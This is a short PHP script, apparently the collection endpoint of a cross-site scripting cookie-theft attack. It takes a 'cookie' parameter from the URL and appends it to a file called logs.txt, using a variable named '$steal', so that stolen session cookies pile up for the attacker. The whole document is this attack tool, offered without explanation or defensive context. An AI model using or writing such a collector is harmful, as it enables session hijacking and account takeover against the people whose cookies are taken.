<?php
$cookie=$_GET["cookie"];
$steal=fopen("logs.txt","a");
fwrite($steal,$cookie."\n");                
fclose($steal);                                 
?>